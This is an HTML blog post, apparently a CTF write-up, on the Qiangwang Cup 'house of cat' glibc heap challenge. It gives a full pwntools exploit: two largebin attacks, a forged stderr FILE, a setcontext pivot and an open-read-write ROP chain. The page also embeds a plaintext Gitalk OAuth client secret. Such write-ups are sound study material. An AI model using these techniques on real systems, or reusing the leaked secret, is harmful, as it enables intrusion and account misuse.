@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    house of cat 强网杯复现 丨
+    
+
+    Whirling-In-Rags
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Whirling-In-Rags" type="application/atom+xml">
+</head>
+
+  <body>
+    <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">Whirling-In-Rags</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/tags">tags</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+      
+            <main class="main">
+              <article class="post">
+  
+  <div class="post-title">house of cat 强网杯复现</div>
+  <div class="post-meta">
+    <div class="date">2023 七月 27日</div>
+    <div class="tags">
+      
+      <a class="tag-item" href="/tags/pwn" style="color: #d1d5da;">pwn</a>
+      
+      <a class="tag-item" href="/tags/wp" style="color: #d1d5da;">wp</a>
+      
+      <a class="tag-item" href="/tags/iofile" style="color: #d1d5da;">iofile</a>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><blockquote>
+<p>最后一天的题，水水</p>
+</blockquote>
+<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="格式检查"><a href="#格式检查" class="headerlink" title="格式检查"></a>格式检查</h3><pre><code class="shell">LOGIN | r00t QWBQWXFadmin
+CAT | r00t QWBQWXF$\xff
+</code></pre>
+<h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>index在0到15间</p>
+<p>0x418&lt;&#x3D; size &lt;&#x3D;0x46f</p>
+<p>使用calloc</p>
+<h4 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h4><p>UAF</p>
+<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>write 0x30</p>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>限制2次</p>
+<p>每次只能修改<strong>0x30</strong></p>
+<h2 id="攻击流程分析"><a href="#攻击流程分析" class="headerlink" title="攻击流程分析"></a>攻击流程分析</h2><p>由于不存在对exit的调用，且在main函数中无限循环，故无法进行FSOP</p>
+<p>可以采用house of kiwi的触发IO思路，利用<code>__malloc_assert</code>调用<code>fflush(stderr)</code>或者<code>__fxprintf</code></p>
+<p>所以需要攻击位于stderr上的指针，恰好本题该地址可写，这里使用一次largebin attack</p>
+<p>另外，要触发<code>__malloc_assert</code>，需要修改topchunk的size</p>
+<p>本题由于edit有长度限制，不方便使用之前构造堆重叠的方式，所以这里可以用第二次largebin attack攻击size</p>
+<p>恰好共有两次edit机会，刚好用完e</p>
+<p>另外，攻击top size时要注意，在将第二个chunk加入largebin时，不能改变top chunk的位置。也就是说，不能通过分配一个更大chunk的方式来得到第二个largechunk</p>
+<p>这是因为对largebin进行unlink的操作在从topchunk分配chunk之前，此时修改过的size会被新的size覆盖掉。</p>
+<p>所以这一步入largebin的操作，可以通过分配更小的chunk获得</p>
+<p><img src="/../img/house-of-cat.assets/image-20230726120735530.png" alt="image-20230726120735530"></p>
+<p>开了沙箱，禁用了execve，并检查read的fd是否为0</p>
+<p>故只能打orw, 并且在open前需要先close(0)</p>
+<h2 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h2><p>需要达到的效果是：两次largebin attack，分别使stderr指向可控内容的堆块、修改topchunk</p>
+<p>看似比较简单，但需注意edit只能修改0x30，且只有两次机会</p>
+<p>所以对伪造结构体内容的写入需要在add操作进行，入largebin之后对前6个地址会有覆盖，实测下来对IO利用没有影响</p>
+<h2 id="IO利用流程分析"><a href="#IO利用流程分析" class="headerlink" title="IO利用流程分析"></a>IO利用流程分析</h2><p>_wide_data&#x3D;fake_io_addr+0x30</p>
+<p>1.将[rdi+0xa0]<code>_wide_data</code>处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。<br>2.将新赋值的[rax1+0x20]<code>_IO_backup_base</code>处的内容赋值给rdx。<br>3.将[rax1+0xe0]</p>
+<p>处的内容赋值给rax，称之为<strong>rax2</strong>。<br>4.call调用[rax2+0x18]处的内容。</p>
+<pre><code class="c">_wide_data-&gt;_IO_read_ptr ！=_wide_data-&gt;_IO_read_end
+_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base
+#如果_wide_data=fake_io_addr+0x30，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base
+fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址
+</code></pre>
+<pre><code class="python">#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+from pwn import*
+
+context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;, terminal = [&#39;tmux&#39;, &#39;new-window&#39;])
+def debug(cmd=&#39;&#39;):
+    cmd += &quot;b main\n&quot;
+    gdb.attach(p, cmd)
+    pause()
+
+host = &quot;&quot;
+port = 0
+p = process(&quot;./pwn&quot;)
+#p = remote(host, port)
+libc = ELF(&quot;./libc.so.6&quot;)
+
+login = &quot;LOGIN | r00t QWB QWXFadmin&quot;
+cat = &quot;CAT | r00t QWB QWXF$\xff&quot;
+
+def add(index, size, content):
+    p.sendafter(&quot;mew~~~~~~\n&quot;, cat)
+    p.sendlineafter(&quot;cat\n&quot;, &quot;1&quot;)
+    p.sendlineafter(&quot;idx:\n&quot;,str(index).encode())
+    p.sendlineafter(&quot;size:\n&quot;,str(size).encode())
+    p.sendafter(&quot;content:\n&quot;,content)
+def delete(index):
+    p.sendafter(&quot;mew~~~~~~\n&quot;, cat)
+    p.sendlineafter(&quot;cat\n&quot;, &quot;2&quot;)
+    p.sendlineafter(&quot;idx:\n&quot;,str(index).encode())
+def show(index):
+    p.sendafter(&quot;mew~~~~~~\n&quot;, cat)
+    p.sendlineafter(&quot;cat\n&quot;, &quot;3&quot;)
+    p.sendlineafter(&quot;idx:\n&quot;,str(index).encode())
+def edit(index, content):
+    p.sendafter(&quot;mew~~~~~~\n&quot;, cat)
+    p.sendlineafter(&quot;cat\n&quot;, &quot;4&quot;)
+    p.sendlineafter(&quot;idx:\n&quot;,str(index).encode())
+    p.sendafter(&quot;content:\n&quot;,content)
+
+p.send(login)
+add(0, 0x420, cyclic(0x420))#largechunk 0
+add(1, 0x440, cyclic(0x440))
+delete(0)
+add(2, 0x450, cyclic(0x450))
+show(0)#leak largechunk
+
+libc_base = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))-0x21a0d0
+stderr_addr = libc_base + 0x21a860
+setcontext61 = libc_base + 0x53a6d
+p.recvuntil(&quot;\x7f\x00\x00&quot;)
+heap_base = u64(p.recvn(6).ljust(8,b&quot;\x00&quot;))-0x290
+log.success(&quot;libc_base = &#123;&#125;&quot;.format(hex(libc_base)))
+log.success(&quot;heap0_base = &#123;&#125;&quot;.format(hex(heap_base)))
+log.success(&quot;stderr_addr = &#123;&#125;&quot;.format(hex(stderr_addr)))
+
+ret = 0x0000000000029cd6+libc_base
+pop_rdi = 0x000000000002a3e5+libc_base
+pop_rsi = 0x000000000002be51+libc_base
+pop_rax = 0x0000000000045eb0 + libc_base
+syscall = 0x0000000000091396 + libc_base
+
+# debug()
+#fake stderr----------------------------------------
+fake_stderr = heap_base + 0xf70
+fake_rdx = fake_stderr + 0x10 + 0x200
+fake_stack = fake_stderr + 0x10 + 0x320
+io = p64(0)*6
+io += p64(1) + p64(2)#rcx!=0
+io += p64(fake_rdx)#backup_base rdx
+io += p64(setcontext61)
+io = io.ljust(0x78, &#39;\x00&#39;)
+io += p64(libc_base+0x21ba60)#lock
+io = io.ljust(0x90, &#39;\x00&#39;)
+io += p64(fake_stderr+0x30)#wide_data rax1
+io = io.ljust(0xb0, &#39;\x00&#39;)
+io += p64(1)#mode
+io = io.ljust(0xc8, &#39;\x00&#39;)
+io += p64(libc_base+libc.sym[&#39;_IO_wfile_jumps&#39;]+0x10)
+io += p64(0)*6
+io += p64(fake_stderr+0x40)
+io = io.ljust(0x200, &#39;\x00&#39;)
+#fake rdx:
+payload = &quot;./flag\x00\x00&quot;
+payload = payload.ljust(0x68,&quot;\x00&quot;)
+payload += p64(0)#rdi-&gt;0
+payload += p64(0)#rsi-&gt;0
+payload = payload.ljust(0x88,&quot;\x00&quot;)
+payload += p64(0x100)#rdx-&gt;0
+payload = payload.ljust(0xa0)
+payload += p64(fake_stack)#rsp-&gt;chunk 1
+payload += p64(ret)#rcx-&gt;ret
+io += payload
+io = io.ljust(0x320,&quot;\x00&quot;)
+#fake_stack:
+payload = p64(libc_base+libc.sym[&#39;close&#39;])
+payload += p64(ret)
+payload += p64(pop_rdi)
+payload += p64(fake_rdx)
+payload += p64(pop_rax)
+payload += p64(2)
+payload += p64(syscall)#open
+payload += p64(pop_rax)
+payload += p64(0)
+payload += p64(pop_rdi)
+payload += p64(0)
+payload += p64(pop_rsi)
+payload += p64(heap_base + 0x100)
+payload += p64(syscall)#read
+payload += p64(pop_rax)
+payload += p64(1)
+payload += p64(pop_rdi)
+payload += p64(1)
+payload += p64(pop_rsi)
+payload += p64(heap_base + 0x100)
+payload += p64(syscall)#write
+io+=payload
+
+io = io.ljust(0x430,&#39;\x00&#39;)
+
+#----------------------------------------------
+
+add(4,0x440,io)# largebin 0 
+add(5,0x440,cyclic(0x440))
+add(6,0x430,cyclic(0x430))#largebin 1
+# add(7,0x440,cyclic(0x440))
+# add(8,0x420,cyclic(0x420))
+delete(4)
+add(9,0x460,cyclic(0x440))
+delete(6)
+#largebin attack
+payload = p64(libc_base+0x21a0e0)*2 + p64(heap_base+0xf90) + p64(stderr_addr-0x20) + p64(0)*2
+edit(4, payload)
+add(10,0x460,cyclic(0x460))
+
+add(11, 0x430, cyclic(0x430))#calloc chunk6
+
+#largebin attack 2
+
+delete(11)#largebin 1 0x430
+#delete(8)
+payload = p64(libc_base+0x21a0e0)*2 + p64(heap_base+0xf90) + p64(heap_base+0x2538-5-0x20) + p64(0)*2
+edit(4, payload)
+add(15,0x41f,cyclic(0x41f))
+
+
+# debug()
+add(7, 0x460,cyclic(0x460))#trigger malloc assert
+
+p.interactive()
+</code></pre>
+</main>
+
+  
+    <div id="gitalk-container"></div> 
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+
+if(true){
+	var gitalk = new Gitalk({
+  	clientID: 'Ov23liOeINaDo82m26KW',
+  	clientSecret: '40d0c404806ec19c706fad7b692aba1c3a281818',
+  	repo: 'DeePunk42.github.io',
+  	owner: 'DeePunk42',
+  	admin: ['DeePunk42'],
+  	id: 'Thu Jul 27 2023 11:20:34 GMT+0800',
+  	distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+    
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+            </main>
+            
+              <footer class="footer">
+  
+  <span>Copyright © 2021 DeePunk</span>
+  
+</footer>
+                
+<script src="/js/theme.js"></script>
+
+  </body>
+
+</html>
